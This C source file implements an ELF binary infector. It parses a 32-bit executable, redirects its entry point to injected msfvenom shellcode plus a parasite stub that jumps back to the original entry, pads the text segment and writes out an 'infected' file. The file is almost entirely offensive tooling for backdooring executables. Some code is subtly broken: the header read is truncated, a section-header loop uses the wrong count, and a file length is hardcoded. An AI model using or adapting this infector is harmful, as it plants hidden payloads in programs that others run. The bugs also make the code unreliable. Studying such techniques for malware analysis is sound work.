#define PAGE_SIZE 4096
#define PARASITE_SIZE 41


#include <elf.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>

//used for memcpy
#include <string.h>

//This struct is used by the function get_shellcode since we need to 
//return two values from the fucntion
typedef struct shellcode_struct{
	int size;
	char * data;
} shellcode_struct;


Elf32_Ehdr * get_elf_header(FILE * fp);
Elf32_Phdr ** get_elf_program_headers(FILE * fp, Elf32_Ehdr * elf_header);
Elf32_Shdr ** get_elf_section_headers(FILE * fp, Elf32_Ehdr * elf_header);
char * get_parasite();
shellcode_struct * get_shellcode(char * argv[]);

void copy_partial(int fd, int od, unsigned int len);


int main(int argc, char * argv[]){
	FILE * fp;
	FILE * shellcode_file;

	Elf32_Ehdr * elf_header;
	Elf32_Phdr ** program_headers;
	Elf32_Shdr ** section_headers;
	shellcode_struct * shellcode;
	char * parasite;
	
	int text_segment_index;
	unsigned int new_code_address;

	struct stat stat;
	
	//open file to be injected for manipulation
	if((fp = fopen(argv[1],"r")) == NULL)
		goto file_to_inject_open_error;	
	
	//get our elf header
	if((elf_header = get_elf_header(fp)) == NULL)
		goto error;
	
	//get elf program headers
	program_headers = get_elf_program_headers(fp, elf_header);
	
	//get elf section headers
	section_headers = get_elf_section_headers(fp, elf_header);

	//In ELF header, increase e_shoff by PAGE_SIZE 
  printf("header e_shoff changed from %x to ",elf_header->e_shoff);
	elf_header->e_shoff = elf_header->e_shoff + PAGE_SIZE;
  printf("%x\n",elf_header->e_shoff);
		
	//patch code to be inserted to jump to original entry point
	//from the elf header.		
	parasite = get_parasite();
  printf("writing entry point %x to parasite.\n",elf_header->e_entry);
	memcpy(&parasite[32],&elf_header->e_entry, 4);	
	
	//Locate the text segment program header	
  int flag_x = 4;
	for(int i=0; i < elf_header->e_phnum; i++){
		if(program_headers[i]->p_type == 1 && program_headers[i]->p_flags & flag_x != 0){
      printf("using text segment at index %d.\n",i);
			text_segment_index = i;
			break;
		}
	}

	//Modify e_entry, in the elf header, to point to new code.
  printf("elf header entry point changed from %x to ",elf_header->e_entry);
	new_code_address = program_headers[text_segment_index]->p_vaddr + program_headers[text_segment_index]->p_filesz;	
	elf_header->e_entry = new_code_address;
  printf("%x.\n",elf_header->e_entry);
	
	//get the shellcode we want to insert into memory.
	shellcode = get_shellcode(argv);
	
	
	//we need the filesz for offset
	int offset=program_headers[text_segment_index]->p_offset+program_headers[text_segment_index]->p_filesz;

	//increase p_filesz to account for new code
  printf("program header filesz changed from %x to ",program_headers[text_segment_index]->p_filesz);
	unsigned int new_p_filesz = program_headers[text_segment_index]->p_filesz+shellcode->size+PARASITE_SIZE;
	program_headers[text_segment_index]->p_filesz = new_p_filesz;
  printf("%x.\n",program_headers[text_segment_index]->p_filesz);
	
	//increase p_memsz to account for new code
  printf("program header memsz changed from %x to ",program_headers[text_segment_index]->p_memsz);
	unsigned int new_p_memsz = program_headers[text_segment_index]->p_memsz+shellcode->size+PARASITE_SIZE;
	program_headers[text_segment_index]->p_memsz = new_p_memsz;
	printf("%x.\n",program_headers[text_segment_index]->p_memsz);

	//For each phdr who's segment is after the insertion -- increase p_offset
	//by PAGE_SIZE ???
	
	printf("The offset is 0x%x (%d)\n", offset,offset);
	for(int i=(text_segment_index+1); i<elf_header->e_phnum; i++){
    if(program_headers[i]->p_offset > offset){
      printf("program_header[%d] offset changed from %x to ",i,program_headers[i]->p_offset);
		  program_headers[i]->p_offset += PAGE_SIZE;
      printf("%x.\n",program_headers[i]->p_offset);
    }
	}
	
	//debug code
	
	/*for(int i=0; i<elf_header->e_shnum;i++){
		printf("The old section header size for %d is %x\n",i,section_headers[i]->sh_offset);
	}*/
	//end debug code
	
	//For each pphdr who's segment is after the insertion -- increase p_offset
	//by PAGE_SIZE ???
	for(int i=0;i<elf_header->e_shnum; i++){
		if(section_headers[i]->sh_offset > offset){
      printf("section header[%d] changed from %x to ",i,section_headers[i]->sh_offset);
			section_headers[i]->sh_offset += PAGE_SIZE;
      printf("%x.\n",section_headers[i]->sh_offset);
		}
    else{
        printf("ignoring section header[%d]. sh_offset=%d(0x%x).\n",i,section_headers[i]->sh_offset,section_headers[i]->sh_offset);
    }
	}
	
	//debug code
	/*for(int i=0; i<elf_header->e_shnum;i++){
		printf("The new section header size for %d is %x\n",i,section_headers[i]->sh_offset);
	}*/
	//end debug code


/*
*Time to inject the shellcode into the file!!!
*
*/
	//create file to write to	
	FILE * infected;
	infected = fopen("infected","w");
	
	//write the elf header file
	fwrite(elf_header,1,elf_header->e_ehsize,infected);
	
	//write the program headers
	for(int i=0; i<elf_header->e_phnum; i++){
    printf("writing program header[%d] (size %d). \n",i,elf_header->e_phentsize);
		fwrite(program_headers[i],elf_header->e_phentsize,1,infected);
	}
	//copy everything up to where we insert the shellcode	
	int position;
	int fd = fileno(fp);
	int infected_descriptor = fileno(infected);
	
	//messy effect of switching from file pointers to file descriptors. Flush or what we have written so 
	//far with fwrite or won't show up. (The data is still buffered write)
	fflush(fp);
	fflush(infected);
	
	lseek(infected_descriptor, position=elf_header->e_ehsize+(elf_header->e_phentsize*elf_header->e_phnum), SEEK_SET);
	lseek(fd, position=elf_header->e_ehsize+(elf_header->e_phentsize*elf_header->e_phnum), SEEK_SET);
	
  printf("copying headers to new file...\n");
	printf("-- offset is:%d\n",offset);
	printf("-- position is %d\n",position);
	printf("-- offset-position is:%d (0x%x)\n",offset-position,offset-position);
  printf("-- prog_header[]->p_offset + offset - position is: %d\n",(program_headers[text_segment_index]->p_offset + offset) - position);
	copy_partial(fd, infected_descriptor, (program_headers[text_segment_index]->p_offset + offset)-position);
	
	//insert the shellcode
	write(infected_descriptor,parasite,PARASITE_SIZE);
	write(infected_descriptor,shellcode->data,shellcode->size);
	
	//calculate the amount of garbage we have to insert into the file
	int garbage_size = PAGE_SIZE-(shellcode->size + PARASITE_SIZE);
	char * garbage = (char *) malloc(garbage_size);
	
	printf("The garbage size is %d\n",garbage_size);

	//Use garbage character 0x42 because life the universe and everything.
	for(int i=0;i<garbage_size;i++){
		garbage[i] = 'B';
	}
	

	//write the garbage to the file
	write(infected_descriptor, garbage, garbage_size);
	
	//write everything up to section header to file
	
	puts("here?");
	copy_partial(fd, infected_descriptor, elf_header->e_shentsize*elf_header->e_shnum);

	//write the section headers to the file
	for(int i=0;i<elf_header->e_shnum; i++){
		write(infected_descriptor, section_headers[i], elf_header->e_shentsize);
	}
	
	if(lseek(fd, position+(elf_header->e_shentsize*elf_header->e_shnum),SEEK_SET)<0){
		puts("LSEEK ERROR");
	}


	//write everything to end of file	
	puts("or here?");
	copy_partial(fd, infected_descriptor,7556-position);
	

	return 0;
	




//If something goes wrong handle it here 
file_to_inject_open_error:
	puts("Failed to open file to inject");
	return -1;
error:
	puts("Program has been terminated");
	return -1;
}

/*
 *Responsible for returning a pointer to an elf struct to us.
 *For the sake of simplicity we will assume that the header is 52 bytes. 
 */
Elf32_Ehdr * get_elf_header(FILE * fp){
	Elf32_Ehdr * elf = (Elf32_Ehdr *) malloc(sizeof(Elf32_Ehdr));
	
	//read in the entire header at once.
	if(fread(elf,1,50,fp) == 0)
		goto elf_header_error;
	return elf;

elf_header_error:
	puts("Failed to read elf header -- are you sure this is an elf?");
	return NULL;	
}


/*
 *Returns an array of ELF program headers. Since it is a double pointer,
 *we can cycle through the program headers as an array.
 */

Elf32_Phdr ** get_elf_program_headers(FILE * fp, Elf32_Ehdr * elf_header){
	
	//Create an array of program headers using malloc
	Elf32_Phdr ** elf_header_list = (Elf32_Phdr **) malloc(sizeof(Elf32_Phdr *) * elf_header->e_phnum);
	
	//allocate memory for each individual program header.
	for(int i = 0; i<elf_header->e_phnum; i++){
		elf_header_list[i] = (Elf32_Phdr *) malloc(elf_header->e_phentsize);
	}
	
	//Jump to start of program header table
	fseek(fp, elf_header->e_phoff, SEEK_SET);

	//copy the data from our elf into the allocated memory.
	for(int i = 0; i< elf_header->e_phnum; i++){
		fread(elf_header_list[i], 1, elf_header->e_phentsize,fp);
	}
	
	return elf_header_list;

}

Elf32_Shdr ** get_elf_section_headers(FILE * fp, Elf32_Ehdr * elf_header){
	
	//Create an array of section headers using malloc
	Elf32_Shdr ** elf_section_header_list = (Elf32_Shdr **) malloc(sizeof(Elf32_Shdr *) * elf_header->e_shnum);
	
	//allocate memory for each individual section header.
	for(int i = 0; i<elf_header->e_shnum; i++){
		elf_section_header_list[i] = (Elf32_Shdr *) malloc(elf_header->e_shentsize);
	}
	
	//Jump to start of program header table
	fseek(fp, elf_header->e_shoff, SEEK_SET);

	//copy the data from our elf into the allocated memory.
	for(int i = 0; i< elf_header->e_phnum; i++){
		fread(elf_section_header_list[i], 1, elf_header->e_shentsize,fp);
	}
	
	return elf_section_header_list;

}

/*
 *Read parasite from file and store it in memory. Returns a character pointer
 *since we will be working with individual bytes
 */

char * get_parasite(){
	FILE * parasite_file;
	
	char * parasite = (char *) malloc(PARASITE_SIZE);
	if((parasite_file = fopen("parasite.raw","r"))==NULL){
		puts("parasite file not found!");
		exit(1);
	}
		
	
	if(fread(parasite, 1, PARASITE_SIZE, parasite_file) == 0){
		puts("woops failed to read parasite.raw Are you sure this is the right file?");
		exit(1);
	}

	fclose(parasite_file);
	return parasite;
	
}

/*
 *Read the shellcode we want to insert from msfvenom into memory and 
 *return struct that contatins both its size and the data.
 */

shellcode_struct * get_shellcode(char * argv[]){
	FILE * shellcode_file;
	int shellcode_size;
	shellcode_struct * shellcode;


	shellcode = (shellcode_struct *) malloc(sizeof(shellcode_struct));

	if((shellcode_file = fopen(argv[2],"r"))==NULL){
		puts("Shellcode file not found.");
		exit(1);
	}
	
	fseek(shellcode_file, 0L, SEEK_END);
	shellcode_size = ftell(shellcode_file);
	fseek(shellcode_file, 0L, SEEK_SET);
	
	shellcode->data = (char *) malloc(shellcode_size);
	shellcode->size = shellcode_size;
	
	
	if(fread(shellcode->data, 1, shellcode_size, shellcode_file) == 0){
		puts("Failed to copy shellcode from file.");
	}

	return shellcode;
}

/*
 *This code is based off of silvio's for copying partial data
 *
 */

void copy_partial(int fd, int od, unsigned int len){
	char idata[PAGE_SIZE];
	unsigned int n=0;
	int r;

	while(n+PAGE_SIZE<len){
		if(read(fd,idata,PAGE_SIZE) != PAGE_SIZE){
			puts("read");
			exit(1);
		}

		if(write(od, idata, PAGE_SIZE)<0){
			puts("write");
			exit(1);
		}
		
		n+=PAGE_SIZE;
	}

	r=read(fd,idata,len-n);
	if(r<0){
		puts("read");
		exit(1);
	}
	
	if(write(od,idata,r)<0){
		puts("write");
		exit(1);
	}

	
}
